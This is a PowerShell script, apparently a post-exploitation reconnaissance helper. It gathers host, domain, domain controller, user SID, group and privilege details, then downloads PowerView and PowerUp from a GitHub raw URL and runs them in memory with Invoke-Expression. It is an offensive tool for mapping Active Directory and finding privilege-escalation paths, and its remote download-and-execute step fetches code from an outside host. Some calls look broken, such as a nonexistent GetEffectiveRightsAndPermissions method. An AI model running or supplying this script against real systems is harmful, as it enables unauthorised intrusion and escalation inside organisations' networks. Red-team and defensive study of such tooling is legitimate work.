## Computer information
$computerName = $env:COMPUTERNAME
$localIP = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -like 'Wi-Fi'}).IPAddress
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
$domainController = (Get-ADDomainController -Discover -Service PrimaryDC).HostName

## User information
$windowsIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$userName = $windowsIdentity.Name
$sid = $windowsIdentity.User.Value
$groups = $windowsIdentity.Groups | ForEach-Object {$_.Translate([System.Security.Principal.NTAccount]).Value}
$principal = [System.Security.Principal.WindowsPrincipal]::new($windowsIdentity)
$privileges = $principal.GetEffectiveRightsAndPermissions('').Privileges | ForEach-Object {$_.DisplayName}

Write-Host "`n"
Write-Host "## Computer information"
Write-Host "Hostname: $computerName"
Write-Host "Local IP address: $localIP"
Write-Host "Domain: $domain"
Write-Host "Domain Controller: $domainController"

Write-Host "`n"
Write-Host "## User information"
Write-Host "Current user: $userName"
Write-Host "SID: $sid"
Write-Host "Groups:`n$($groups -join "`n")"
Write-Host "Privileges:`n$($privileges -join "`n")" -Newline

Write-Host "`n"
Write-Host "Importing powerview and powerup modules"
## Import powerview and powerup modules
try {
    $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/conma293/mvp/main/PowerView.ps1' -UseBasicParsing
    Invoke-Expression $($pwContent.Content)
    Import-Module PowerView
    Write-Output "Powerview loaded"
} catch {
    Write-Output "Could not load Powerview: $($_.Exception.Message)"
}

try {
    $puContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/conma293/mvp/main/PowerUp.ps1' -UseBasicParsing
    Invoke-Expression $($puContent.Content)
    Import-Module PowerUp
    Write-Output "PowerUp loaded"
} catch {
    Write-Output "Could not load PowerUp: $($_.Exception.Message)"
}
